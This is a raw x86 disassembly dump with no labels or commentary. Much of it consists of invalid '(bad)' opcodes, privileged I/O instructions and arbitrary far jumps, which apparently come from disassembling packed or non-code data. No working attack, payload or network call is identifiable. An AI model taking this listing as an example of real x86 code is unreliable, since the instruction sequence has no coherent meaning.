  41c4a2:	cs dec esp
  41c4a4:	mov    ecx,0x8626b08d
  41c4a9:	cdq    
  41c4aa:	int    0xe8
  41c4ac:	dec    ebp
  41c4ad:	mov    ebx,DWORD PTR [ebx+esi*1+0x76]
  41c4b1:	(bad)  
  41c4b2:	in     eax,dx
  41c4b3:	(bad)  
  41c4b4:	std    
  41c4b5:	jne    0x41c4ba
  41c4b7:	in     al,dx
  41c4b8:	clc    
  41c4b9:	cmc    
  41c4ba:	mov    ah,0x22
  41c4bc:	lea    eax,[ebp+0x5a8e6b9d]
  41c4c2:	inc    esp
  41c4c3:	cmp    DWORD PTR [edx+0x25],edi
  41c4c6:	scas   al,BYTE PTR es:[edi]
  41c4c7:	nop
  41c4c8:	lock dec esp
  41c4ca:	retf   0xde31
  41c4cd:	xchg   DWORD PTR [esi+ecx*1+0x4],eax
  41c4d1:	xchg   edi,eax
  41c4d2:	cli    
  41c4d3:	pop    edi
  41c4d4:	in     eax,dx
  41c4d5:	jo     0x41c49a
  41c4d7:	xor    bl,BYTE PTR [edx-0x3c]
  41c4da:	scas   eax,DWORD PTR es:[edi]
  41c4db:	nop
  41c4dc:	cs mov edi,0x36e72df5
  41c4e2:	enter  0xc48,0x3d
  41c4e6:	fs mov esi,0xb434ed30
  41c4ec:	cmp    BYTE PTR [ecx-0x10],dh
  41c4ef:	jno    0x41c4b4
  41c4f1:	and    eax,0xdf4c0ac2
  41c4f6:	sub    DWORD PTR [edx+esi*8-0xd],esi
  41c4fa:	inc    esp
  41c4fb:	push   ebx
  41c4fc:	xchg   ecx,eax
  41c4fd:	test   al,0x70
  41c4ff:	pop    ebx
  41c500:	jge    0x41c50a
  41c502:	jl     0x41c581
  41c504:	(bad)  
  41c505:	mov    eax,ds:0x9c17b41b
  41c50a:	adc    BYTE PTR [esi-0x16],bl
  41c50d:	jae    0x41c54e
  41c50f:	adc    al,0x48
  41c511:	out    dx,eax
  41c512:	rol    DWORD PTR [edi-0x4d95006e],0xf
  41c519:	(bad)  
  41c51a:	ror    DWORD PTR [edi],cl
  41c51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c51d:	jo     0x41c52e
  41c51f:	mov    ds:0xfca8ce48,al
  41c524:	fwait
  41c525:	stc    
  41c526:	repz pop es
  41c528:	in     eax,dx
  41c529:	lds    ebp,FWORD PTR [ebx-0xf]
  41c52c:	call   0xbe57575a
  41c531:	scas   al,BYTE PTR es:[edi]
  41c532:	cs mov esi,0xc5
	...
  41c594:	add    BYTE PTR [eax],al
  41c596:	lds    esp,FWORD PTR [ebx]
  41c598:	xchg   ecx,eax
  41c599:	and    eax,0xe3f5b7f7
  41c59e:	sbb    ch,BYTE PTR [edx+0x10]
  41c5a1:	stc    
  41c5a2:	cdq    
  41c5a3:	outs   dx,BYTE PTR ds:[esi]
  41c5a4:	ret    0x63bf
  41c5a7:	sub    eax,DWORD PTR [ecx]
  41c5a9:	add    BYTE PTR [edi],al
  41c5ab:	add    DWORD PTR [eax],eax
  41c5ad:	add    dl,dh
  41c5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b0:	and    DWORD PTR [eax+ebp*1],ebp
  41c5b3:	pop    eax
  41c5b4:	adc    ecx,DWORD PTR [edx+eiz*4]
  41c5b7:	add    DWORD PTR [ecx-0x6bf30f9f],edi
  41c5bd:	mov    edi,0xf4aecfb9
  41c5c2:	push   ss
  41c5c3:	push   ds
  41c5c4:	fwait
  41c5c5:	in     eax,0xe9
  41c5c7:	pop    edx
  41c5c8:	sbb    DWORD PTR [edi+0xd],ecx
  41c5cb:	call   0x4a8edfab
  41c5d0:	(bad)  
  41c5d1:	jmp    0x41c56d
  41c5d3:	bound  ebx,QWORD PTR [edi-0x5adecf0a]
  41c5d9:	xor    ecx,DWORD PTR [esi]
  41c5db:	popa   
  41c5dc:	enter  0xa6be,0xa6
  41c5e0:	aaa    
  41c5e1:	mov    edx,0x9d58d637
  41c5e6:	sub    esp,0x31
  41c5e9:	sub    BYTE PTR [ecx+0x35],dh
  41c5ec:	int3   
  41c5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ee:	jns    0x41c60b
  41c5f0:	dec    ecx
  41c5f1:	fs das 
  41c5f3:	pushf  
  41c5f4:	stos   DWORD PTR es:[edi],eax
  41c5f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5f6:	js     0x41c63c
  41c5f8:	xchg   esi,eax
  41c5f9:	dec    esi
  41c5fa:	loopne 0x41c5ac
  41c5fc:	fmul   QWORD PTR [edi-0x33]
  41c5ff:	fild   QWORD PTR [eax+0x731a4c5f]
  41c605:	xchg   BYTE PTR [ebp+0x28dfd602],cl
  41c60b:	mov    bh,0xd9
  41c60d:	and    al,0xf0
  41c60f:	pop    esi
  41c610:	clc    
  41c611:	jae    0x41c64f
  41c613:	pushf  
  41c614:	(bad)  
  41c615:	xchg   edi,eax
  41c616:	mov    eax,ds:0x3dc81de6
  41c61b:	pop    ss
  41c61c:	or     eax,0xd2c0814a
  41c621:	loop   0x41c5ae
  41c623:	mov    gs,WORD PTR [ebp+0x58e5c25e]
  41c629:	xor    bh,BYTE PTR [edx]
  41c62b:	in     al,dx
  41c62c:	xlat   BYTE PTR ds:[ebx]
  41c62d:	js     0x41c6a7
  41c62f:	inc    eax
  41c630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c631:	xor    al,0x9e
  41c633:	pop    esi
  41c634:	(bad)  
  41c635:	data16 adc bh,BYTE PTR [eax]
  41c638:	add    al,0x4b
  41c63a:	test   BYTE PTR [edi+0x5ad59e8f],bl
  41c640:	mov    gs,ebx
  41c642:	fcmovbe st,st(2)
  41c644:	mov    dh,0xc3
  41c646:	xor    edx,DWORD PTR [eax]
  41c648:	cmp    BYTE PTR [esi+0x515c5f32],ah
  41c64e:	rol    dh,cl
  41c650:	dec    esp
  41c651:	ficomp DWORD PTR [eax+0x461319eb]
  41c657:	xlat   BYTE PTR ds:[ebx]
  41c658:	das    
  41c659:	mov    dl,0x25
  41c65b:	rol    BYTE PTR [edx+0x70db9838],0x1
  41c662:	and    edi,edi
  41c664:	and    dh,BYTE PTR [edi+eiz*2-0x4c5c9044]
  41c66b:	out    dx,al
  41c66c:	into   
  41c66d:	in     al,0xe9
  41c66f:	mov    esp,0x4e04ecd2
  41c674:	(bad)
  41c677:	cmp    BYTE PTR [esi+0x37],bh
  41c67a:	sti    
  41c67b:	sbb    bh,BYTE PTR [ecx+0x67c2e57c]
  41c681:	mov    dl,0xb5
  41c683:	pusha  
  41c684:	retf   0xa066
  41c687:	jge    0x41c6c3
  41c689:	add    ebx,ecx
  41c68b:	xchg   esp,eax
  41c68c:	mov    esp,0x49a5f253
  41c691:	mov    BYTE PTR [ebx+0x68f18546],bh
  41c697:	bound  ecx,QWORD PTR [esp+ebx*4-0x2d1eef1d]
  41c69e:	data16 cli 
  41c6a0:	cmp    eax,0xf21c77ca
  41c6a5:	test   DWORD PTR [ebx],0x6067a0d9
  41c6ab:	clc    
  41c6ac:	imul   ebp,esp,0x79
  41c6af:	int3   
  41c6b0:	mov    bl,0xa
  41c6b2:	xchg   edi,eax
  41c6b3:	mov    ch,0x3c
	...
  41c715:	add    dl,bl
  41c717:	add    edx,eax
  41c719:	xchg   bl,bl
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	jge    0x41c77d
  41c724:	mov    eax,fs:0x12c6a
  41c72a:	pop    es
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    BYTE PTR [ebx+0x32344f6c],al
  41c733:	imul   edi,DWORD PTR [edi-0x79],0x64621410
  41c73a:	aaa    
  41c73b:	neg    BYTE PTR [ebx-0x61786326]
  41c741:	punpckhwd mm6,mm0
  41c744:	push   eax
  41c745:	inc    ecx
  41c746:	sub    eax,0x48b79cd
  41c74b:	adc    ebx,ebx
  41c74d:	jle    0x41c7a4
  41c74f:	mov    bl,0x7e
  41c751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c752:	add    esp,DWORD PTR [ebx+0x15]
  41c755:	cwde   
  41c756:	sub    al,0xa4
  41c758:	fsub   DWORD PTR [eax]
  41c75a:	dec    ebp
  41c75b:	test   al,0x31
  41c75d:	out    0x57,al
  41c75f:	iret   
  41c760:	inc    eax
  41c761:	dec    eax
  41c762:	mov    edx,0x110406be
  41c767:	mov    al,0x44
  41c769:	iret   
  41c76a:	and    bh,bh
  41c76c:	pusha  
  41c76d:	inc    eax
  41c76e:	in     al,0xcd
  41c770:	in     al,dx
  41c771:	xchg   esp,eax
  41c772:	into   
  41c773:	and    eax,0x5ca19a49
  41c778:	mov    ds:0xdaceec7,al
  41c77d:	fnstenv [edi-0x19f41676]
  41c783:	xlat   BYTE PTR ds:[ebx]
  41c784:	(bad)  
  41c785:	fdivr  st(6),st
  41c787:	xchg   ecx,eax
  41c788:	push   edx
  41c789:	jle    0x41c775
  41c78b:	ins    BYTE PTR es:[edi],dx
  41c78c:	rcpps  xmm2,XMMWORD PTR [eax]
  41c78f:	in     al,0x7
  41c791:	inc    ebx
  41c792:	outs   dx,DWORD PTR ds:[esi]
  41c793:	or     cl,BYTE PTR [esi-0x63d2d04]
  41c799:	adc    al,0x42
  41c79b:	mov    al,0xab
  41c79d:	pop    ebx
  41c79e:	sar    DWORD PTR [esi-0x52587684],1
  41c7a4:	call   0x407e:0xc1d9ae0d
  41c7ab:	popa   
  41c7ac:	push   ss
  41c7ad:	sbb    eax,0x41bf0fd5
  41c7b2:	lea    ebx,[esi]
  41c7b4:	sub    al,0x6c
  41c7b6:	dec    ebx
  41c7b7:	test   al,0x8d
  41c7b9:	sbb    dh,bh
  41c7bb:	mov    dl,0xff
  41c7bd:	or     cl,BYTE PTR [ebx-0x5c31c477]
  41c7c3:	outs   dx,DWORD PTR ds:[esi]
  41c7c4:	xlat   BYTE PTR ds:[ebx]
  41c7c5:	leave  
  41c7c6:	xor    DWORD PTR [edi],ecx
  41c7c8:	mov    eax,ds:0x7f7c558
  41c7cd:	icebp  
  41c7ce:	inc    esp
  41c7cf:	mov    dh,0x7e
  41c7d1:	call   0x8b10:0x339014ca
  41c7d8:	sub    DWORD PTR [edi+0x26],0x386d1d6f
  41c7df:	or     BYTE PTR [edx+0x2d3103d9],ah
  41c7e5:	addr16 inc edx
  41c7e7:	mov    al,0x24
  41c7e9:	fnstsw WORD PTR [edx]
  41c7eb:	fwait
  41c7ec:	clc    
  41c7ed:	add    esi,edx
  41c7ef:	xchg   edx,eax
  41c7f0:	cmp    al,0x7b
  41c7f2:	pop    esi
  41c7f3:	dec    ecx
  41c7f4:	sub    al,bl
  41c7f6:	clc    
  41c7f7:	shl    BYTE PTR [eax+0x56],0x36
  41c7fb:	push   eax
  41c7fc:	dec    ecx
  41c7fd:	test   bl,dh
  41c7ff:	and    BYTE PTR ds:0x608e7d23,bh
  41c805:	sbb    edx,DWORD PTR [edi-0x7a]
  41c808:	sti    
  41c809:	ins    BYTE PTR es:[edi],dx
  41c80a:	pushf  
  41c80b:	imul   ecx,ecx,0xffffffe3
  41c80e:	pushf  
  41c80f:	and    eax,0x782ffa7d
  41c814:	or     DWORD PTR [eax+0x6ba0aae0],esi
  41c81a:	xor    eax,0xaacc3a6a
  41c81f:	ja     0x41c8a0
  41c821:	mov    ebx,0xa113b588
  41c826:	pop    ds
  41c827:	inc    ebx
  41c828:	pop    esi
  41c829:	neg    BYTE PTR [edx]
  41c82b:	fucomip st,st(1)
  41c82d:	jge    0x41c898
  41c82f:	popf   
  41c830:	(bad)  
  41c831:	loopne 0x41c864
  41c833:	dec    edx
	...
  41c894:	add    BYTE PTR [eax],al
  41c896:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c89d:	ja     0x41c8c2
  41c89f:	cs js  0x41c910
  41c8a2:	mov    bh,0x16
  41c8a4:	(bad)  
  41c8a5:	dec    ebp
  41c8a6:	jno    0x41c8d5
  41c8a8:	add    DWORD PTR [eax],eax
  41c8aa:	pop    es
  41c8ab:	add    DWORD PTR [eax],eax
  41c8ad:	add    ch,dl
  41c8af:	push   ebx
  41c8b0:	out    0x8a,al
  41c8b2:	add    DWORD PTR [esi],0xffffffcc
  41c8b5:	into   
  41c8b6:	ret    
  41c8b7:	test   BYTE PTR [eax+0x4e69629],ch
  41c8bd:	outs   dx,BYTE PTR ds:[esi]
  41c8be:	mov    al,0xf2
  41c8c0:	mov    DWORD PTR [esi+0x39edeba5],ebp
  41c8c6:	mov    DWORD PTR [edi+eiz*8+0x3c],0xa6f83d4c
  41c8ce:	cmp    edi,DWORD PTR [edi-0x6e]
  41c8d1:	loopne 0x41c886
  41c8d3:	mov    BYTE PTR [ebx+0x53],ah
  41c8d6:	shr    DWORD PTR [esi-0x5a96b8b9],1
  41c8dc:	add    cl,dl
  41c8de:	sbb    DWORD PTR [edx+ebx*4],edi
  41c8e1:	daa    
  41c8e2:	fidivr DWORD PTR [edx]
  41c8e4:	adc    DWORD PTR [edx-0x7c42b72c],ebx
  41c8ea:	push   edi
  41c8eb:	cdq    
  41c8ec:	xor    DWORD PTR [eax+0x4e],ebx
  41c8ef:	sub    bl,0x19
  41c8f2:	popf   
  41c8f3:	adc    BYTE PTR [ecx+0x53],dh
  41c8f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8f7:	popa   
  41c8f8:	repnz mov al,0x43
  41c8fb:	jmp    0x41c966
  41c8fd:	cmp    al,0x6f
  41c8ff:	mov    ds:0x6dd9c65c,eax
  41c904:	add    ebx,edx
  41c906:	(bad)  [edx-0x4a42df00]
  41c90c:	dec    edx
  41c90d:	popa   
  41c90e:	stos   BYTE PTR es:[edi],al
  41c90f:	or     cl,BYTE PTR [esi-0x1b87eb00]
  41c915:	mov    esp,DWORD PTR [ecx-0x69f078af]
  41c91b:	cli    
  41c91c:	outs   dx,DWORD PTR ds:[esi]
  41c91d:	inc    edi
  41c91e:	inc    edi
  41c91f:	jmp    DWORD PTR [ebx-0x5]
  41c922:	leave  
  41c923:	(bad)  
  41c924:	pop    edi
  41c925:	and    dl,bl
  41c927:	sub    DWORD PTR [edi-0x4487cbf1],0x2eb6e508
  41c931:	leave  
  41c932:	inc    esi
  41c933:	rol    edx,0x7c
  41c936:	fst    QWORD PTR [ebx+0x46]
  41c939:	add    al,0x0
  41c93b:	xchg   BYTE PTR [ecx+0x1013e729],ah
  41c941:	dec    ebp
  41c942:	lahf   
  41c943:	mov    bl,0x59
  41c945:	jg     0x41c9ba
  41c947:	fdivr  st,st(0)
  41c949:	jno    0x41c931
  41c94b:	loopne 0x41c90e
  41c94d:	cmp    BYTE PTR [edi],0xc6
  41c950:	mov    ds:0xeba129cb,eax
  41c955:	push   edi
  41c956:	mov    edi,0xfd76ccc5
  41c95b:	ja     0x41c94d
  41c95d:	rcl    BYTE PTR [ebp+esi*2-0x1458072b],cl
  41c964:	aas    
  41c965:	push   ebp
  41c967:	(bad)  
  41c968:	pop    esi
  41c969:	aam    0xbd
  41c96b:	jp     0x41c9c3
  41c96d:	jl     0x41c9af
  41c96f:	loopne 0x41c9a2
  41c971:	pop    es
  41c972:	or     al,0x2d
  41c974:	test   DWORD PTR [esi+eax*8+0x10],0x67872b72
  41c97c:	or     bh,dh
  41c97e:	idiv   BYTE PTR [eax+ecx*1-0x35]
  41c982:	push   edi
  41c983:	(bad)  
  41c984:	cli    
  41c985:	bound  esp,QWORD PTR [eax+0x8]
  41c988:	jbe    0x41c9fd
  41c98a:	jo     0x41c94c
  41c98c:	lahf   
  41c98d:	je     0x41c9d3
  41c98f:	and    esi,edx
  41c991:	mov    cl,bh
  41c993:	mov    eax,ds:0xcd87720b
  41c998:	xlat   BYTE PTR ds:[ebx]
  41c999:	lock sbb al,0xb2
  41c99c:	and    esi,DWORD PTR [esi+0x5b]
  41c99f:	push   esp
  41c9a0:	popa   
  41c9a1:	cmp    eax,0x5c0b6d7d
  41c9a6:	stc    
  41c9a7:	(bad)  
  41c9a8:	sbb    esi,ebp
  41c9aa:	es adc al,0x5d
  41c9ad:	adc    esp,esi
  41c9af:	sub    esp,ebp
  41c9b1:	sbb    esp,DWORD PTR [edi-0x3c]
  41c9b4:	and    al,BYTE PTR [eax]
	...
  41ca16:	lock retf 0xfc94
  41ca1a:	mov    esi,0x1bcef8fe
  41ca1f:	sub    al,bl
  41ca21:	test   eax,0x801744de
  41ca26:	js     0x41ca56
  41ca28:	add    DWORD PTR [eax],eax
  41ca2a:	pop    es
  41ca2b:	add    DWORD PTR [eax],eax
  41ca2d:	add    BYTE PTR [ebx],ah
  41ca2f:	jmp    0x41caa6
  41ca31:	inc    eax
  41ca32:	and    BYTE PTR [esp+eax*4+0x3e],ah
  41ca36:	cmp    eax,0x3b778b71
  41ca3b:	push   esp
  41ca3c:	fwait
  41ca3d:	mov    ch,0x20
  41ca3f:	xchg   edx,eax
  41ca40:	mov    ebx,0x9a6cc35d
  41ca45:	push   ebx
  41ca46:	xchg   ebx,eax
  41ca47:	pusha  
  41ca48:	sti    
  41ca49:	ja     0x41ca01
  41ca4b:	ret    0xbf37
  41ca4e:	std    
  41ca4f:	leave  
  41ca50:	inc    edx
  41ca51:	push   esp
  41ca52:	out    0x48,al
  41ca54:	pop    ss
  41ca55:	xchg   BYTE PTR [ebx-0x42],ah
  41ca58:	jg     0x41ca8f
  41ca5a:	enter  0x8210,0x5
  41ca5e:	or     eax,0xe25dec02
  41ca63:	mov    esp,0x7d8998f8
  41ca68:	xchg   DWORD PTR [edi-0x24d76085],edi
  41ca6e:	iret   
  41ca6f:	add    edi,DWORD PTR [edx-0x12563635]
  41ca75:	iret   
  41ca76:	dec    edi
  41ca77:	xor    BYTE PTR [esi],cl
  41ca79:	lock out 0x43,eax
  41ca7c:	shl    DWORD PTR [ecx-0x7f4b1aac],1
  41ca82:	shl    BYTE PTR [esi],0xb5
  41ca85:	jae    0x41cae6
  41ca87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca88:	or     dl,BYTE PTR [ebp+0x32]
  41ca8b:	mov    dh,0x7a
  41ca8d:	cmp    eax,0x720df44c
  41ca92:	repz in eax,dx
  41ca94:	sar    DWORD PTR [eax],cl
  41ca96:	xchg   ebx,eax
  41ca97:	jnp    0x41cafc
  41ca99:	add    al,0x3
  41ca9b:	xchg   ebp,eax
  41ca9c:	mov    BYTE PTR ds:0x366ed500,cl
  41caa2:	sub    DWORD PTR ds:0xaa2118fc,ebp
  41caa8:	mov    bl,0x33
  41caaa:	aaa    
  41caab:	jo     0x41ca96
  41caad:	mov    ?,WORD PTR [eax+0x3f]
  41cab0:	int3   
  41cab1:	jnp    0x41cb0a
  41cab3:	dec    esp
  41cab4:	jmp    0xf44f:0xc8c03bf8
  41cabb:	popf   
  41cabc:	cmp    DWORD PTR [edx-0x6f],0x5f
  41cac0:	xor    ch,BYTE PTR [ebx]
  41cac2:	push   esi
  41cac3:	pop    ecx
  41cac4:	mov    ds:0xf9436e32,al
  41cac9:	jge    0x41cb38
  41cacb:	jge    0x41caab
  41cacd:	mov    ecx,0x9381aec5
  41cad2:	(bad)
  41cad7:	ror    BYTE PTR [ecx+ecx*1-0x63],cl
  41cadb:	call   0x8b3b:0x3307e92a
  41cae2:	or     ch,ch
  41cae4:	inc    esp
  41cae5:	ja     0x41cb43
  41cae7:	cwde   
  41cae8:	pop    es
  41cae9:	jnp    0x41cb58
  41caeb:	pop    edx
  41caec:	fsubr  QWORD PTR [ebp-0x1e069842]
  41caf2:	and    dh,BYTE PTR [eax]
  41caf4:	pop    esi
  41caf5:	dec    eax
  41caf6:	jbe    0x41cab9
  41caf8:	cmp    dh,BYTE PTR [edx+0x76]
  41cafb:	jo     0x41cb11
  41cafd:	cmc    
  41cafe:	or     esi,DWORD PTR [esp+ebx*4-0x21]
  41cb02:	rol    BYTE PTR [esi-0x32],1
  41cb05:	sub    ecx,DWORD PTR [ebp-0x21c88683]
  41cb0b:	add    al,0xa7
  41cb0d:	push   edi
  41cb0e:	cli    
  41cb0f:	aad    0x56
  41cb11:	lods   eax,DWORD PTR ds:[esi]
  41cb12:	pop    ebx
  41cb13:	cmp    BYTE PTR [ebx],dl
  41cb15:	dec    edx
  41cb16:	mov    edi,0xe255bcc0
  41cb1b:	and    bl,BYTE PTR [edx+0x1c]
  41cb1e:	ds push esi
  41cb20:	(bad)  
  41cb21:	sub    esp,ebp
  41cb23:	mov    edi,0x6985402f
  41cb28:	xor    al,0x45
  41cb2a:	xor    dl,BYTE PTR [ecx]
  41cb2c:	pop    ds
  41cb2d:	mov    ebp,0x584b232a
  41cb32:	or     eax,0x2fd5
	...
  41cb93:	add    BYTE PTR [eax],al
  41cb95:	add    BYTE PTR [ecx],ch
  41cb97:	(bad)  
  41cb98:	sti    
  41cb99:	pop    ebp
  41cb9a:	(bad)  
  41cb9b:	jge    0x41cb4c
  41cb9d:	div    BYTE PTR [esi-0x283dc3b4]
  41cba3:	cld    
  41cba4:	xchg   edi,eax
  41cba5:	ins    BYTE PTR es:[edi],dx
  41cba6:	jg     0x41cbd7
  41cba8:	add    DWORD PTR [eax],eax
  41cbaa:	pop    es
  41cbab:	add    DWORD PTR [eax],eax
  41cbad:	add    BYTE PTR [esi-0x459fb5ce],bl
  41cbb3:	xchg   DWORD PTR [edi-0x23],eax
  41cbb6:	(bad)  
  41cbb7:	shl    BYTE PTR [eax-0x2a],0xf7
  41cbbb:	xchg   ecx,eax
  41cbbc:	jo     0x41cc06
  41cbbe:	dec    ebp
  41cbbf:	mov    esp,eax
  41cbc1:	jno    0x41cba0
  41cbc3:	dec    edx
  41cbc4:	adc    esp,0xffffff9c
  41cbc7:	cs iret 
  41cbc9:	and    cl,BYTE PTR [edi+0x218efe43]
  41cbcf:	mov    ebp,0xd0b8045c
  41cbd4:	aam    0xb9
  41cbd6:	dec    edx
  41cbd7:	mov    esi,0x1c1ab6a7
  41cbdc:	jmp    0xb0279701
  41cbe1:	in     eax,0x85
  41cbe3:	mov    ch,0xa5
  41cbe5:	je     0x41cbfa
  41cbe7:	(bad)  
  41cbe8:	icebp  
  41cbe9:	int    0x82
  41cbeb:	lahf   
  41cbec:	sub    al,bl
  41cbee:	fs mov ecx,0xf4d4aaf5
  41cbf4:	shr    DWORD PTR [ecx+edx*2],cl
  41cbf7:	dec    esi
  41cbf8:	adc    DWORD PTR [ebx],0x77
  41cbfb:	or     dl,BYTE PTR [esp+ecx*1+0x7c0e24a5]
  41cc02:	mov    dl,0x1b
  41cc04:	mov    esp,0x8e250651
  41cc09:	xor    al,0xb9
  41cc0b:	test   DWORD PTR [ecx+0x61],eax
  41cc0e:	mov    ebp,0x55e4d8f0
  41cc13:	xchg   ebx,eax
  41cc14:	dec    ebp
  41cc15:	fisubr DWORD PTR [eax+0x22830ba4]
  41cc1b:	dec    edx
  41cc1c:	pop    ds
  41cc1d:	(bad)  
  41cc1e:	lea    ecx,[edi+0x1dd4fa62]
  41cc24:	loop   0x41cc25
  41cc26:	stos   BYTE PTR es:[edi],al
  41cc27:	fwait
  41cc28:	mov    ebx,edi
  41cc2a:	loop   0x41cc31
  41cc2c:	sbb    cl,dl
  41cc2e:	repz scas al,BYTE PTR es:[edi]
  41cc30:	std    
  41cc31:	in     al,0x5
  41cc33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc34:	xchg   edi,eax
  41cc35:	and    eax,0x53178183
  41cc3a:	xor    DWORD PTR [esi+eax*8],0x252b8bba
  41cc41:	mov    dl,ah
  41cc43:	mov    ebp,0x3b072711
  41cc48:	dec    ebx
  41cc49:	and    dl,0x99
  41cc4c:	leave  
  41cc4d:	lahf   
  41cc4e:	xchg   edx,eax
  41cc4f:	fdivrp st(0),st
  41cc51:	imul   BYTE PTR [ecx+esi*4+0x1d45f3e5]
  41cc58:	mov    ebp,0xe3e750a4
  41cc5d:	sbb    cl,cl
  41cc5f:	je     0x41cc32
  41cc61:	pop    ecx
  41cc62:	ror    BYTE PTR [edx+0x4e77d5d5],0xda
  41cc69:	dec    ecx
  41cc6a:	push   0xefee9b7b
  41cc6f:	stos   DWORD PTR es:[edi],eax
  41cc70:	sub    al,0x96
  41cc72:	popa   
  41cc73:	in     al,0xbb
  41cc75:	mov    WORD PTR [ecx],?
  41cc77:	frstor [ebp-0x25e66074]
  41cc7d:	lds    ecx,FWORD PTR [ebx+0x75]
  41cc80:	fucomp st(2)
  41cc82:	push   edx
  41cc83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc84:	or     DWORD PTR [esi],esi
  41cc86:	jno    0x41ccb2
  41cc88:	ins    BYTE PTR es:[edi],dx
  41cc89:	iret   
  41cc8a:	sub    esi,DWORD PTR [edi+0x8]
  41cc8d:	xchg   BYTE PTR [ebx-0x216ccb5f],cl
  41cc93:	dec    ebx
  41cc94:	neg    DWORD PTR [edx+0x53e1a90a]
  41cc9a:	mov    ebx,gs
  41cc9c:	test   BYTE PTR [edx-0x74],ch
  41cc9f:	lahf   
  41cca0:	jle    0x41ccda
  41cca2:	bound  eax,QWORD PTR [edx-0x4e]
  41cca5:	shr    ch,0xa7
  41cca8:	pop    esp
  41cca9:	shr    DWORD PTR [ecx],1
  41ccab:	push   ecx
  41ccac:	sbb    ebx,DWORD PTR [esi]
  41ccae:	je     0x41ccc9
  41ccb0:	sbb    BYTE PTR [ebx+edx*1+0x4891],bl
	...
  41cd13:	add    BYTE PTR [eax],al
  41cd15:	add    BYTE PTR [eax-0x67],ah
  41cd18:	fsubr  st(5),st
  41cd1a:	std    
  41cd1b:	in     eax,0x79
  41cd1d:	popf   
  41cd1e:	dec    ebx
  41cd1f:	int    0x76
  41cd21:	hlt    
  41cd22:	out    dx,al
  41cd23:	ret    
  41cd24:	xchg   al,ah
  41cd26:	xchg   BYTE PTR [eax],dh
  41cd28:	add    DWORD PTR [eax],eax
  41cd2a:	pop    es
  41cd2b:	add    DWORD PTR [eax],eax
  41cd2d:	add    BYTE PTR [ebx],ah
  41cd2f:	adc    eax,0xa75e56d8
  41cd34:	(bad)  
  41cd35:	mov    ds:0xd81e14c2,eax
  41cd3a:	jmp    0xb3eee381
  41cd3f:	retf   0xc30e
  41cd42:	(bad)  
  41cd43:	xor    BYTE PTR [ebx+0x74],cl
  41cd46:	outs   dx,BYTE PTR ds:[esi]
  41cd47:	add    cl,dl
  41cd49:	jle    0x41cd69
  41cd4b:	stos   DWORD PTR es:[edi],eax
  41cd4c:	fisub  WORD PTR [edi-0x54]
  41cd4f:	out    0x6f,al
  41cd51:	or     eax,0x540b2733
  41cd56:	or     ah,BYTE PTR [edx+0x31a4670f]
  41cd5c:	icebp  
  41cd5d:	xchg   edx,eax
  41cd5e:	sub    ecx,DWORD PTR [ebx+edx*1-0x29]
  41cd62:	stos   DWORD PTR es:[edi],eax
  41cd63:	ss jl  0x41cdce
  41cd66:	mov    eax,0x5bd266bd
  41cd6b:	and    DWORD PTR [eax+0x2f],esi
  41cd6e:	xchg   ecx,eax
  41cd6f:	push   eax
  41cd70:	scas   eax,DWORD PTR es:[edi]
  41cd71:	ret    
  41cd72:	xor    BYTE PTR [ebx+0x7beda0af],0xd0
  41cd79:	mov    ebp,0xa4fb377d
  41cd7e:	push   0x921bf33a
  41cd83:	jmp    0x41cd1b
  41cd85:	cmp    eax,0xb5d09fb6
  41cd8a:	mov    ecx,0x2bcec5a6
  41cd8f:	push   ecx
  41cd90:	call   0x8c2c:0x559015d
  41cd97:	mov    DWORD PTR [ecx],esp
  41cd99:	jne    0x41cddc
  41cd9b:	pop    ds
  41cd9c:	std    
  41cd9d:	outs   dx,BYTE PTR ds:[esi]
  41cd9e:	mov    ds:0x5993ed61,eax
  41cda3:	or     BYTE PTR [ebp+0x57014670],bh
  41cda9:	rcr    BYTE PTR [ecx+eax*2+0x1da3dcef],0x9d
  41cdb1:	sub    esi,DWORD PTR [edx+0x6c]
  41cdb4:	jmp    0x2580850d
  41cdb9:	add    DWORD PTR [eax+eiz*8],ecx
  41cdbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdbd:	mov    dh,0x6
  41cdbf:	xor    cl,dl
  41cdc1:	shl    BYTE PTR [edx],0x22
  41cdc4:	xchg   esi,eax
  41cdc5:	xchg   BYTE PTR [esp+ebx*2-0x1c],cl
  41cdc9:	pushf  
  41cdca:	pop    esp
  41cdcb:	dec    ecx
  41cdcc:	or     edx,DWORD PTR [ebx]
  41cdce:	je     0x41ce12
  41cdd0:	aad    0xd9
  41cdd2:	mov    ch,0xdf
  41cdd4:	mov    eax,0x7c7018f5
  41cdd9:	adc    BYTE PTR [ecx+0x5e],bl
  41cddc:	dec    esp
  41cddd:	int    0xec
  41cddf:	sub    bh,BYTE PTR [ebx+0x27e0ad94]
  41cde5:	les    ecx,FWORD PTR [esi+0x81586bb]
  41cdeb:	sbb    BYTE PTR [esi],ah
  41cded:	cs jp  0x41ce5d
  41cdf0:	cmp    ah,BYTE PTR [ebx-0x14]
  41cdf3:	adc    eax,0x47413f99
  41cdf8:	nop
  41cdf9:	lods   eax,DWORD PTR ds:[esi]
  41cdfa:	stos   DWORD PTR es:[edi],eax
  41cdfb:	mov    eax,ds:0x829d4da2
  41ce00:	test   DWORD PTR [eax+eax*4-0x70c6b885],ecx
  41ce07:	lods   al,BYTE PTR ds:[esi]
  41ce08:	or     al,0x18
  41ce0a:	mov    edi,0x28bd6dfe
  41ce0f:	inc    esi
  41ce10:	xchg   edx,edx
  41ce12:	cdq    
  41ce13:	fisttp DWORD PTR [eax+0x4f332767]
  41ce19:	jmp    0x1c6e:0x7ee8da4d
  41ce20:	fwait
